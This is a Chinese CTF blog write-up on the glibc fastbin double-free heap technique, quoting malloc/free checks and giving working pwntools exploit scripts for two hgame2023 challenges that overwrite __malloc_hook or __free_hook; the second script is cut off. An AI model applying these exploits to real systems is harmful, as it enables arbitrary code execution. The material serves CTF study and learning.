@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="锵锵！how2heap系列第一篇！正式开始堆漏洞系列的学习！系列模式预计是原理+例题，还有各版本的利用差异冲！(｡･∀･)ﾉﾞ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastbin_dup">
+<meta property="og:url" content="http://akaieurus.github.io/2023/01/23/fastbin-dup/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="锵锵！how2heap系列第一篇！正式开始堆漏洞系列的学习！系列模式预计是原理+例题，还有各版本的利用差异冲！(｡･∀･)ﾉﾞ">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://akaieurus.github.io/2023/01/23/fastbin-dup/fake_chunk.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/01/23/fastbin-dup/one_gadget.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/01/23/fastbin-dup/realloc.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/01/23/fastbin-dup/realloc_hook.png">
+<meta property="article:published_time" content="2023-01-23T05:26:50.000Z">
+<meta property="article:modified_time" content="2023-01-23T08:01:14.756Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="how2heap">
+<meta property="article:tag" content="fastbin_dup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://akaieurus.github.io/2023/01/23/fastbin-dup/fake_chunk.png">
+
+<link rel="canonical" href="http://akaieurus.github.io/2023/01/23/fastbin-dup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>fastbin_dup | Eurus禁止摆烂！</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Eurus禁止摆烂！</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">In a world of locked rooms, the man with the key is king.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://akaieurus.github.io/2023/01/23/fastbin-dup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Eurus">
+      <meta itemprop="description" content="本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eurus禁止摆烂！">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          fastbin_dup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-01-23 13:26:50 / Modified: 16:01:14" itemprop="dateCreated datePublished" datetime="2023-01-23T13:26:50+08:00">2023-01-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/pwn/heap/" itemprop="url" rel="index"><span itemprop="name">heap</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>锵锵！how2heap系列第一篇！正式开始堆漏洞系列的学习！系列模式预计是原理+例题，还有各版本的利用差异<br>冲！(｡･∀･)ﾉﾞ</p>
+<span id="more"></span>
+<h3 id="相关检查（所用源码版本2-23）"><a href="#相关检查（所用源码版本2-23）" class="headerlink" title="相关检查（所用源码版本2.23）"></a>相关检查（所用源码版本2.23）</h3><p>malloc中对从fastbin中取chunk的检查只有size的合法性检查</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">         <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">           &#123;</span><br><span class="line"><span class="comment">//chunksize和相应fastbin链的大小相符检测</span></span><br><span class="line">             errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">           errout:</span><br><span class="line">             malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">             <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>
+<p>free中对于将chunk放进fastbin的检查有：</p>
+<ul>
+<li>开始对所有chunk的对齐和大小是否超界的检查<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//筛掉一些特别大的chunk（超出内存边界）</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (<span class="built_in">misaligned_chunk</span> (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="type">void</span>) <span class="built_in">mutex_unlock</span> (&amp;av-&gt;mutex);</span><br><span class="line">      <span class="built_in">malloc_printerr</span> (check_action, errstr, <span class="built_in">chunk2mem</span> (p), av);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//对齐检查</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !<span class="built_in">aligned_OK</span> (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
+<li>下一个chunk是不是top chunk<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(<span class="built_in">get_max_fast</span> ())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     &amp;&amp; (<span class="built_in">chunk_at_offset</span>(p, size) != av-&gt;top)</span><br><span class="line"></span><br><span class="line">     )</span><br></pre></td></tr></table></figure></li>
+<li>下一个chunk的大小是否超界的检查<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> <span class="function"><span class="params">(__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span></span></span><br><span class="line"><span class="params"><span class="function">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span></span></span><br><span class="line"><span class="params"><span class="function">		     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span></span></span><br><span class="line"><span class="function">     &#123;</span></span><br><span class="line"><span class="function">/* <span class="title">We</span> <span class="title">might</span> <span class="title">not</span> <span class="title">have</span> <span class="title">a</span> <span class="title">lock</span> <span class="title">at</span> <span class="title">this</span> <span class="title">point</span> <span class="title">and</span> <span class="title">concurrent</span> <span class="title">modifications</span></span></span><br><span class="line"><span class="function">   <span class="title">of</span> <span class="title">system_mem</span> <span class="title">might</span> <span class="title">have</span> <span class="title">let</span> <span class="title">to</span> <span class="title">a</span> <span class="title">false</span> <span class="title">positive</span>.  <span class="title">Redo</span> <span class="title">the</span> <span class="title">test</span></span></span><br><span class="line"><span class="function">   <span class="title">after</span> <span class="title">getting</span> <span class="title">the</span> <span class="title">lock</span>.  */</span></span><br><span class="line"><span class="function"><span class="title">if</span> <span class="params">(have_lock</span></span></span><br><span class="line"><span class="params"><span class="function">    || (&#123; assert (locked == <span class="number">0</span>);</span></span></span><br><span class="line"><span class="params"><span class="function">	  mutex_lock(&amp;av-&gt;mutex);</span></span></span><br><span class="line"><span class="params"><span class="function">	  locked = <span class="number">1</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">	  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span></span></span><br><span class="line"><span class="params"><span class="function">	    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span></span></span><br><span class="line"><span class="params"><span class="function">      &#125;))</span></span></span><br><span class="line"><span class="function">  &#123;</span></span><br><span class="line"><span class="function">    <span class="title">errstr</span> = &quot;<span class="title">free</span><span class="params">()</span>: <span class="title">invalid</span> <span class="title">next</span> <span class="title">size</span> <span class="params">(fast)</span>&quot;;</span></span><br><span class="line"><span class="function">    <span class="title">goto</span> <span class="title">errout</span>;</span></span><br><span class="line"><span class="function">  &#125;</span></span><br></pre></td></tr></table></figure></li>
+<li>fastbin的第一个chunk是不是插入的chunk（double free检查）<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attribute">errstr</span> = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="attribute">goto</span> errout;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
+<li>以及chunk的大小合法性检查<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (have_lock <span class="variable">&amp;&amp;</span> old != <span class="keyword">NULL</span> <span class="variable">&amp;&amp;</span> __builtin_expect (old_idx != idx, 0))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="2-23-2-25"><a href="#2-23-2-25" class="headerlink" title="2.23-2.25"></a>2.23-2.25</h4><p>为了避开free中double free的检查（只检查第一个chunk是不是正在free的chunk），一般在double free中间再free另一个chunk形成<code>a-&gt;b-&gt;a</code>的形式再通过申请回第一个a来改变最后一个a的fd指针指向fake chunk<br>一般会将fd指针指向<code>__malloc_hook-0x23</code>，这个地址+8有一个0x7f，可以作为合法的size。这样我们可以在申请chunk的时候申请0x60大小的chunk来绕开chunk的size的合法性检查，将malloc_hook改为one_gadget的地址（free_hook前面全是0）</p>
+<img src="/2023/01/23/fastbin-dup/fake_chunk.png" class title="fake chunk">
+<h4 id="2-27-2-33"><a href="#2-27-2-33" class="headerlink" title="2.27-2.33"></a>2.27-2.33</h4><p>2.26比之前最大的变化就是在fastbin之前增加了tcache，利用方法也发（bian）生（jian）了（dan）变（le）化（ne）    </p>
+<ul>
+<li>先申请7个chunk填满tcache</li>
+<li>再在fastbin中形成<code>a-&gt;b-&gt;a</code></li>
+<li>再把tcache清空</li>
+<li>再申请一个chunk就可以申请到a，同时b和a（2）就会被放进tcache，这时tcache是这样的<code>b-&gt;a</code>（fastbin的chunk放进tcache是每次取最后一个chunk再执行tcache_put）</li>
+<li>由于tcache中没有size的检查，所以直接改free_hook就行（注意tcache中的指针指向的是chunk中的data）</li>
+</ul>
+<h4 id="2-34以上"><a href="#2-34以上" class="headerlink" title="2.34以上"></a>2.34以上</h4><p>hook没了呜呜呜&#x2F;(ㄒoㄒ)&#x2F;~~</p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="hgame2023-week2-fast-note"><a href="#hgame2023-week2-fast-note" class="headerlink" title="hgame2023 week2 fast_note"></a>hgame2023 week2 fast_note</h4><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>libc版本2.23<br>金典的菜单题，有UAF。思路就是先填满tcache利用unsorted bin泄露libc基址，再用fastbin double free将malloc_hook改为one_gadget<br>这道题麻烦的地方在于四个one_gadget都不可用   </p>
+<img src="/2023/01/23/fastbin-dup/one_gadget.png" class title="one_gadget">
+<p>其中后三个one_gadget限定的是栈空间，那我们就可以通过realloc调节栈内容</p>
+<h5 id="realloc调节栈内容"><a href="#realloc调节栈内容" class="headerlink" title="realloc调节栈内容"></a>realloc调节栈内容</h5><p>realloc的执行流程和malloc一样也是先检查hook是否为null，如果不为null就调用hook<br>realloc函数开头有很多push指令，可以通过push指令抬高栈，push指令的数量可以通过偏移调整</p>
+<img src="/2023/01/23/fastbin-dup/realloc.png" class title="realloc（libc-2.23.so）">
+<p>我们可以将malloc_hook填充为realloc_hook+offset（offset可取0，2，4，6，12，13），offset越小，push指令越少，栈地址越高；再将realloc_hook填充为one_gadget。而realloc_hook的地址其实就在malloc_hook上方</p>
+<img src="/2023/01/23/fastbin-dup/realloc_hook.png" class title="realloc_hook">
+<p>在改fd指针时可以一趟改掉</p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(index,size,content):</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt;&#x27;</span>,b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index: &#x27;</span>,str(index).encode())</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Size: &#x27;</span>,str(size).encode())</span><br><span class="line">    p.sendafter(b<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt;&#x27;</span>,b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index: &#x27;</span>,str(index).encode())</span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt;&#x27;</span>,b<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index: &#x27;</span>,str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./fast&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="attribute">p</span>=remote(&#x27;week-2.hgame.lwsec.cn&#x27;,31626)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="attribute">libc</span>=ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line"><span class="built_in">add</span>(0,0xf0,b<span class="string">&#x27;E&#x27;</span>)</span><br><span class="line"><span class="built_in">add</span>(1,0x60,b<span class="string">&#x27;E&#x27;</span>)</span><br><span class="line"><span class="built_in">add</span>(2,0x60,b<span class="string">&#x27;E&#x27;</span>)</span><br><span class="line"><span class="built_in">add</span>(3,0x60,b<span class="string">&#x27;E&#x27;</span>)</span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line"><span class="attribute">s</span>=p.recvuntil(b&#x27;\n&#x27;)[:-1].ljust(8,b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="attribute">libcbase</span>=u64(s)-0x68-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(hex(libcbase))</span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line"><span class="attribute">malloc_hook</span>=libcbase+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="attribute">realloc_addr</span>=libcbase+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(hex(malloc_hook))</span><br><span class="line"><span class="attribute">one_addr</span>=libcbase+0xf1247</span><br><span class="line"><span class="built_in">add</span>(4,0x60,p64(malloc_hook-0x23))</span><br><span class="line"><span class="built_in">add</span>(5,0x60,b<span class="string">&#x27;E&#x27;</span>)</span><br><span class="line"><span class="built_in">add</span>(6,0x60,b<span class="string">&#x27;E&#x27;</span>)</span><br><span class="line"><span class="built_in">add</span>(7,0x60,b<span class="string">&#x27;\x00&#x27;</span>*(0x13-0x8)+p64(one_addr)+p64(realloc_addr+6))</span><br><span class="line"><span class="comment">#add(8,0x10,b&#x27;a&#x27;)</span></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;&gt;&#x27;</span>,b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Index: &#x27;</span>,str(8).encode())</span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Size: &#x27;</span>,str(16).encode())</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#pause()</span></span><br></pre></td></tr></table></figure>
+<h4 id="hgame2023-week2-new-fast-note"><a href="#hgame2023-week2-new-fast-note" class="headerlink" title="hgame2023 week2 new_fast_note"></a>hgame2023 week2 new_fast_note</h4><p>libc版本2.31</p>
+<h5 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h5><p>没啥难度，就是tcache版本的fastbin double free，不说了。就是注意这道题没有重复malloc的检查了（做的时候没看见QAQ）</p>
+<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(index,size,content):</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt;&#x27;</span>,b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index: &#x27;</span>,str(index).encode())</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Size: &#x27;</span>,str(size).encode())</span><br><span class="line">    p.sendafter(b<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt;&#x27;</span>,b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index: &#x27;</span>,str(index).encode())</span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt;&#x27;</span>,b<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index: &#x27;</span>,str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./new&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;)</span></span><br><span class="line"><span class="attribute">libc</span>=ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line"><span class="attribute">p</span>=remote(&#x27;week-2.hgame.lwsec.cn&#x27;,30170)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(8):</span><br><span class="line">    <span class="built_in">add</span>(i,0xf0,b<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"><span class="built_in">add</span>(8,0x10,b<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(8):</span><br><span class="line">    delete(i)</span><br><span class="line">show(7)</span><br><span class="line"><span class="attribute">s</span>=p.recvuntil(b&#x27;\n&#x27;)[:-1].ljust(8,b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="attribute">libcbase</span>=u64(s)-0x70-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(hex(libcbase))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(8):</span><br><span class="line">    <span class="built_in">add</span>(i,0xf0,b<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(9):</span><br><span class="line">    <span class="built_in">add</span>(i,0x20,b<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"><span class="built_in">add</span>(9,0x10,b<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(9):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(7)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(7):</span><br><span class="line">    <span class="built_in">add</span>(i,0x20,b<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"><span class="attribute">free_hook</span>=libcbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="attribute">system_addr</span>=libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">add</span>(7,0x20,p64(free_hook))</span><br><span class="line"><span class="built_in">add</span>(8,0x20,b<span class="string">&#x27;Q&#x27;</span>)</span><br><span 